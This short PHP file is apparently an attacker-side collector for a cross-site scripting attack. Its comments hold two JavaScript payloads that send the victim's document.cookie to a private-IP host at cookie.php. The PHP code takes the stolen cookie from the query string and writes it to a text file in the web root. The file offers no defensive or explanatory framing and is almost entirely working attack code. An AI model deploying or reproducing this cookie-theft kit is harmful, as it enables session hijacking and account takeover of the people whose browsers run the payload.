<?php
// <script>document.location="http://192.168.0.26/cookie.php?cookie="+document.cookie;</script>

/*
	var cookie = document.cookie;
	var url = "http://192.168.0.26/cookie.php?cookie="
	new Image().src = url + cookie;
*/

$cookie = $_GET['cookie'];
$save_file = fopen("/var/www/html/cookie.txt", "w");
fwrite($save_file, $cookie);
fclose($save_file);
?>